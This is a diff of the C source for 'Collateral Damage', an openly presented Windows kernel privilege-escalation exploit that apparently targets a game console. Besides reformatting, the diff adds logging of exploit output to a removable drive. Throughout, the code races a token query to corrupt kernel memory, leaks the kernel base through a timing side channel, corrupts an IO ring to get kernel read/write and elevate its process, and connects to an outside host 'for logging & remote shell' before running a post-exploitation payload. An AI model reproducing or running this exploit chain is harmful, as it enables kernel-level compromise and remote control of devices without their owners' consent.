@@ -1,11 +1,12 @@
 //
-// Collateral Damage - Emma Kirkpatrick @carrot_c4k3 & Lander Brandt @landaire (exploits.forsale)
+// Collateral Damage - Emma Kirkpatrick @carrot_c4k3 & Lander Brandt @landaire
+// (exploits.forsale)
 //
 #include <Windows.h>
-#include <stdio.h>
-#include <winternl.h>
 #include <sddl.h>
+#include <stdio.h>
 #include <winsock2.h>
+#include <winternl.h>
 
 #include "ioring.h"
 #include "nt_offsets.h"
@@ -16,6 +17,8 @@ SOCKET winSock;
 struct sockaddr_in sockAddr;
 int port = 7070;
 
+// file stuff
+HANDLE outputFile;
 
 // struct representing the info passed in from gamescript at a static address
 typedef struct _COLLAT_INFO {
@@ -27,30 +30,26 @@ typedef struct _COLLAT_INFO {
 ULONG64 ullSystemEPROCaddr = 0;
 UINT64 g_kernel_base = 0;
 
-
 // misc windows definitions
 #define STATUS_SUCCESS ((NTSTATUS)0)
-#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
 #define SystemBuildVersionInformation 222
 
 NTSYSCALLAPI
 NTSTATUS
 NTAPI
 NtQueryInformationToken(
-    _In_ HANDLE TokenHandle,
-    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
-    _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) PVOID TokenInformation,
-    _In_ ULONG TokenInformationLength,
-    _Out_ PULONG ReturnLength
-);
+    _In_ HANDLE TokenHandle, _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
+    _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength)
+        PVOID TokenInformation,
+    _In_ ULONG TokenInformationLength, _Out_ PULONG ReturnLength);
 
 // All the code for triggering the bug lives here
 volatile ULONG64* smash_ptr = NULL;
 ULONG64 smash_var = 0;
 
 // this function will run in a second thread to attempt to trigger the bug
-DWORD smash_func(LPVOID unused)
-{
+DWORD smash_func(LPVOID unused) {
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
 
     ULONG64 val = smash_var;
@@ -67,18 +66,18 @@ BYTE output_buf[0x8000];
 DWORD bytes_returned = 0;
 WCHAR* test_ptr = 0;
 
-VOID do_write(UINT64 addr)
-{
+VOID do_write(UINT64 addr) {
     smash_var = addr;
 
     HANDLE hthread = CreateThread(NULL, 0, smash_func, NULL, 0, NULL);
 
-    for (UINT i = 0; i < 0x80000; i++) //while (1)
+    for (UINT i = 0; i < 0x80000; i++)  // while (1)
     {
         *test_ptr = 0;
-        NtQueryInformationToken(token_handle, TokenAccessInformation, output_buf, sizeof(output_buf), &bytes_returned);
-        if (*test_ptr == 0)
-        {
+        NtQueryInformationToken(token_handle, TokenAccessInformation,
+                                output_buf, sizeof(output_buf),
+                                &bytes_returned);
+        if (*test_ptr == 0) {
             break;
         }
     }
@@ -86,9 +85,9 @@ VOID do_write(UINT64 addr)
 }
 
 // build a security descriptor which is accessible to our process
-void setup_sd()
-{
-    PBYTE sd_page = VirtualAlloc(0x65000000, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+void setup_sd() {
+    PBYTE sd_page = VirtualAlloc(0x65000000, 0x100000, MEM_RESERVE | MEM_COMMIT,
+                                 PAGE_READWRITE);
 
     PBYTE psid_system = sd_page;
     psid_system[0] = 0x01;
@@ -205,11 +204,11 @@ void setup_sd()
     return 0;
 }
 
-int do_exploit()
-{
+int do_exploit() {
     ULONG sd_ptr_offset = get_sd_ptr_offset();
 
-    // map the fake security descriptor that we will be swapping the real one with
+    // map the fake security descriptor that we will be swapping the real one
+    // with
     setup_sd();
 
     // grab the kernel base first!
@@ -218,12 +217,12 @@ int do_exploit()
 
     // get our token handle so we can prepare to trigger the bug
     OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &token_handle);
-    NtQueryInformationToken(token_handle, TokenAccessInformation, output_buf, sizeof(output_buf), &bytes_returned);
+    NtQueryInformationToken(token_handle, TokenAccessInformation, output_buf,
+                            sizeof(output_buf), &bytes_returned);
 
     // search for the string attribute string ("TSA://ProcUnique")
     UINT64 magic_ptr = 0;
-    for (UINT i = 0; i < sizeof(output_buf) - 0x20; i++)
-    {
+    for (UINT i = 0; i < sizeof(output_buf) - 0x20; i++) {
         if (memcmp(&output_buf[i], magic_str, 0x20) == 0) {
             magic_ptr = &output_buf[i];
             break;
@@ -232,8 +231,7 @@ int do_exploit()
     test_ptr = magic_ptr;
 
     // search for the pointer to the string to get the actual smash target
-    for (UINT i = 0; i < sizeof(output_buf) - 0x20; i++)
-    {
+    for (UINT i = 0; i < sizeof(output_buf) - 0x20; i++) {
         if (memcmp(&output_buf[i], &magic_ptr, 8) == 0) {
             smash_ptr = &output_buf[i];
             break;
@@ -272,14 +270,13 @@ UINT64 sidechannel(PVOID ptr);
 MEM_RANGE* g_ranges_ptr;
 UINT32 g_ranges_count;
 
-VOID dump_timings(const char* output_file, PUINT32 timings)
-{
-    HANDLE h_file = CreateFileA(output_file, GENERIC_WRITE,          // open for writing
-        0,                      // do not share
-        NULL,                   // default security
-        CREATE_NEW,             // create new file only
-        FILE_ATTRIBUTE_NORMAL,  // normal file
-        NULL);
+VOID dump_timings(const char* output_file, PUINT32 timings) {
+    HANDLE h_file = CreateFileA(output_file, GENERIC_WRITE,  // open for writing
+                                0,                           // do not share
+                                NULL,                        // default security
+                                CREATE_NEW,             // create new file only
+                                FILE_ATTRIBUTE_NORMAL,  // normal file
+                                NULL);
 
     DWORD bytes_written = 0;
 
@@ -292,23 +289,25 @@ VOID dump_timings(const char* output_file, PUINT32 timings)
     // Uncomment to re-enable dumping timings to disc
     WriteFile(h_file, &f_step, sizeof(f_step), &bytes_written, 0);
     WriteFile(h_file, &f_iterations, sizeof(f_iterations), &bytes_written, 0);
-    WriteFile(h_file, &f_dummy_iterations, sizeof(f_dummy_iterations), &bytes_written, 0);
+    WriteFile(h_file, &f_dummy_iterations, sizeof(f_dummy_iterations),
+              &bytes_written, 0);
     WriteFile(h_file, &f_addr_count, sizeof(f_addr_count), &bytes_written, 0);
     WriteFile(h_file, &f_start_addr, sizeof(f_start_addr), &bytes_written, 0);
-    WriteFile(h_file, timings, (ADDR_COUNT * ITERATIONS) * sizeof(UINT32), &bytes_written, 0);
-    
+    WriteFile(h_file, timings, (ADDR_COUNT * ITERATIONS) * sizeof(UINT32),
+              &bytes_written, 0);
 
     FlushFileBuffers(h_file);
     CloseHandle(h_file);
 }
 
-UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
-{
-    CHAR dump_path[0x200] = { 0 };
-    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\timings.bin", dump_path, sizeof(dump_path));
+UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/) {
+    CHAR dump_path[0x200] = {0};
+    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\timings.bin",
+                              dump_path, sizeof(dump_path));
 
     HANDLE h_heap = GetProcessHeap();
-    PUINT32 timings = HeapAlloc(h_heap, 0, (ADDR_COUNT * ITERATIONS) * sizeof(UINT32));
+    PUINT32 timings =
+        HeapAlloc(h_heap, 0, (ADDR_COUNT * ITERATIONS) * sizeof(UINT32));
     PUINT32 avgs = HeapAlloc(h_heap, 0, ADDR_COUNT * sizeof(UINT32));
     MEM_RANGE* ranges = HeapAlloc(h_heap, 0, sizeof(MEM_RANGE) * 0x400);
     UINT32 ranges_count = 0;
@@ -317,8 +316,7 @@ UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
     for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++) {
         UINT64 x = 0;
         UINT64 addr = KERNEL_LOWER_BOUND;
-        while (x < ADDR_COUNT)
-        {
+        while (x < ADDR_COUNT) {
             UINT64 addr = KERNEL_LOWER_BOUND + (x * STEP);
             UINT64 res = sidechannel(addr);
             if (i >= DUMMY_ITERATIONS) {
@@ -328,14 +326,12 @@ UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
         }
     }
 
-    //dump_timings(dump_path, timings);
+    // dump_timings(dump_path, timings);
 
     // take avgs
-    for (UINT64 x = 0; x < ADDR_COUNT; x++)
-    {
+    for (UINT64 x = 0; x < ADDR_COUNT; x++) {
         UINT64 avg = 0;
-        for (UINT64 i = 0; i < ITERATIONS; i++)
-        {
+        for (UINT64 i = 0; i < ITERATIONS; i++) {
             avg += timings[(x * ITERATIONS) + i];
         }
         avg /= ITERATIONS;
@@ -343,15 +339,12 @@ UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
     }
 
     // account for anomalies on boundaries
-    for (UINT64 x = 0; x < ADDR_COUNT; x++)
-    {
+    for (UINT64 x = 0; x < ADDR_COUNT; x++) {
         UINT64 addr = KERNEL_LOWER_BOUND + (x * STEP);
-        if (addr % 0x2000000 == 0)
-        {
+        if (addr % 0x2000000 == 0) {
             if (x + 1 < ADDR_COUNT) {
                 avgs[x] = avgs[x + 1];
-            }
-            else {
+            } else {
                 avgs[x] = avgs[x - 1];
             }
         }
@@ -363,22 +356,20 @@ UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
 
     UINT64 cur_range = 0;
     UINT64 cur_range_len = 0;
-    for (UINT64 i = 0; i < ADDR_COUNT; i++)
-    {
+    for (UINT64 i = 0; i < ADDR_COUNT; i++) {
         UINT32 cur_timing = avgs[i];
         if (cur_timing > threshold) {
             if (cur_range) {
                 cur_range_len++;
-            }
-            else {
+            } else {
                 cur_range = i;
                 cur_range_len = 1;
             }
-        }
-        else {
+        } else {
             if (cur_range) {
                 if (cur_range_len > 4) {
-                    ranges[ranges_count].addr = KERNEL_LOWER_BOUND + ((i - cur_range_len) * STEP);
+                    ranges[ranges_count].addr =
+                        KERNEL_LOWER_BOUND + ((i - cur_range_len) * STEP);
                     ranges[ranges_count].count = cur_range_len;
                     ranges_count++;
                 }
@@ -408,15 +399,47 @@ UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
     return kernel_base;
 }
 
-int main(int argc, char** argv)
-{
+BOOL write_msg(SOCKET sock, HANDLE f, CHAR* msg) {
+    BOOL result = send(sock, msg, strlen(msg), 0);
+
+    if (f != NULL) {
+        WriteFile(f, msg, strlen(msg), NULL, NULL);
+    }
+    return result;
+}
+
+int main(int argc, char** argv) {
     DWORD bytes_written = 0;
     UINT64 ioring_addr = 0;
     ULONG build_rev = 0;
-	CHAR path[0x400] = { 0 };
-    CHAR ptr_msg[0x400] = { 0 };
+    CHAR path[0x400] = {0};
+    CHAR ptr_msg[0x400] = {0};
     CHAR* cur_msg = NULL;
-	CHAR* file_part = NULL;
+    CHAR* file_part = NULL;
+    CHAR drive_path[4] = "A:\\";
+    CHAR output_path[MAX_PATH] = "";
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(sa);
+    sa.lpSecurityDescriptor = NULL;
+    sa.bInheritHandle = TRUE;
+
+    // Find a removable drive to write logs to
+    for (int i = 65; i < 91; i++) {
+        char drive = (char)i;
+        char path[4] = {drive, ':', '\\', '\0'};
+        if (GetDriveTypeA(path) == DRIVE_REMOVABLE) {
+            strcpy(drive_path, path);
+            break;
+        }
+    }
+
+    // Concatenate the drive letter with the output path
+    strcpy(output_path, drive_path);
+    strcat(output_path, "\\output.txt");
+
+    // Open `output.txt` in utf8 on the removable drive
+    outputFile = CreateFileA(output_path, FILE_WRITE_DATA | FILE_READ_DATA, 0,
+                             &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
     // Connect to the host for logging & remote shell
     int start = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -424,38 +447,39 @@ int main(int argc, char** argv)
     sockAddr.sin_family = AF_INET;
     sockAddr.sin_port = htons(port);
     sockAddr.sin_addr.s_addr = inet_addr(GLOBAL_INFO->ip_addr);
-    WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);
+    WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL,
+               NULL, NULL);
 
     // Write our banner message
-    cur_msg = "Collateral Damage - @carrot_c4k3 & @landaire (exploits.forsale)\n";
-    send(winSock, cur_msg, strlen(cur_msg), 0);
+    cur_msg =
+        "Collateral Damage - @carrot_c4k3 & @landaire (exploits.forsale)\n";
+    write_msg(winSock, outputFile, cur_msg);
 
     // Get and print the build number
     ULONG ret_len = 0;
-    SYSTEM_BUILD_VERSION_INFORMATION build_version = { 0 };
+    SYSTEM_BUILD_VERSION_INFORMATION build_version = {0};
     ULONG layer = 0;
-    NtQuerySystemInformationEx(SystemBuildVersionInformation, &layer, sizeof(layer), &build_version, sizeof(build_version), &ret_len);
-    sprintf_s(ptr_msg, sizeof(ptr_msg), "Build number: %i.%i\n", build_version.NtBuildNumber, build_version.NtBuildQfe);
-    send(winSock, ptr_msg, strlen(ptr_msg), 0);
+    NtQuerySystemInformationEx(SystemBuildVersionInformation, &layer,
+                               sizeof(layer), &build_version,
+                               sizeof(build_version), &ret_len);
+    sprintf_s(ptr_msg, sizeof(ptr_msg), "Build number: %i.%i\n",
+              build_version.NtBuildNumber, build_version.NtBuildQfe);
+    write_msg(winSock, outputFile, ptr_msg);
 
     // Check that the build is supported
-    if (build_version.NtBuildNumber == 25398)
-    {
-        if (build_version.NtBuildQfe == 4478)
-        {
+    if (build_version.NtBuildNumber == 25398) {
+        if (build_version.NtBuildQfe == 4478) {
             build_rev = 4478;
-        }
-        else if (build_version.NtBuildQfe == 4908 || build_version.NtBuildQfe == 4909)
-        {
+        } else if (build_version.NtBuildQfe == 4908 ||
+                   build_version.NtBuildQfe == 4909) {
             // offsets are the same for 4908 and 4909
             build_rev = 4908;
         }
     }
 
-    if (build_rev == 0)
-    {
+    if (build_rev == 0) {
         cur_msg = "Unsupported build! Aborting.\n";
-        send(winSock, cur_msg, strlen(cur_msg), 0);
+        write_msg(winSock, outputFile, cur_msg);
         exit(0);
     }
 
@@ -463,34 +487,34 @@ int main(int argc, char** argv)
 
     // Attempt to leak the kernel address
     cur_msg = "Attempting to find kernel base...\n";
-    send(winSock, cur_msg, strlen(cur_msg), 0);
+    write_msg(winSock, outputFile, cur_msg);
     FlushFileBuffers(winSock);
     UINT64 nt_base = do_sidechannel();
     g_kernel_base = nt_base;
 
     // If it fails bail and tell the user to reboot
-    if (nt_base == 0)
-    {
-        cur_msg = "Failed to find kernel base! Reboot your console and try again.\n";
-        send(winSock, cur_msg, strlen(cur_msg), 0);
+    if (nt_base == 0) {
+        cur_msg =
+            "Failed to find kernel base! Reboot your console and try again.\n";
+        write_msg(winSock, outputFile, cur_msg);
         exit(0);
         return 0;
     }
 
     // Log the kernel base we leaked
-    sprintf_s(ptr_msg, sizeof(ptr_msg), "Found likely kernel base: %p\n", nt_base);
-    send(winSock, ptr_msg, strlen(ptr_msg), 0);
-    
+    sprintf_s(ptr_msg, sizeof(ptr_msg), "Found likely kernel base: %p\n",
+              nt_base);
+    write_msg(winSock, outputFile, ptr_msg);
+
     // Do the first part of the exploit: corrupting SeMediumDaclSd
     cur_msg = "Attempting exploit...\n";
-    send(winSock, cur_msg, strlen(cur_msg), 0);
+    write_msg(winSock, outputFile, cur_msg);
     do_exploit();
 
     // If we succeeded the system EPROC should be non-null
-    if (ullSystemEPROCaddr == 0)
-    {
+    if (ullSystemEPROCaddr == 0) {
         cur_msg = "Exploit failed! Reboot your console and try again.\n";
-        send(winSock, cur_msg, strlen(cur_msg), 0);
+        write_msg(winSock, outputFile, cur_msg);
         exit(0);
         return 0;
     }
@@ -498,23 +522,25 @@ int main(int argc, char** argv)
     // Setup the IO ring
     ioring_addr = 0;
     int res = ioring_setup(&ioring_addr);
-    if (res != 0)
-    {
-        sprintf_s(ptr_msg, sizeof(ptr_msg), "IO Ring setup failed. Result: %i\nReboot your console and try again.\n", res);
-        send(winSock, ptr_msg, strlen(ptr_msg), 0);
+    if (res != 0) {
+        sprintf_s(ptr_msg, sizeof(ptr_msg),
+                  "IO Ring setup failed. Result: %i\nReboot your console and "
+                  "try again.\n",
+                  res);
+        write_msg(winSock, outputFile, ptr_msg);
     }
 
     // Corrupt the IO ring object
     do_write(ioring_addr + 0x9D);
 
     // Get kernel RW & elevate our process, then fix up SeMediumDaclSd
-    ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x1000, ioring_addr, g_kernel_base, build_rev);
+    ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x1000, ioring_addr,
+                g_kernel_base, build_rev);
     cur_msg = "Exploit succeeded! Running payload!\n\n";
-    send(winSock, cur_msg, strlen(cur_msg), 0);
+    write_msg(winSock, outputFile, cur_msg);
 
     // Run our post-exploitation code
-    post_exploit(winSock);
-    
+    post_exploit(winSock, outputFile, drive_path);
 
-	return 0;
+    return 0;
 }
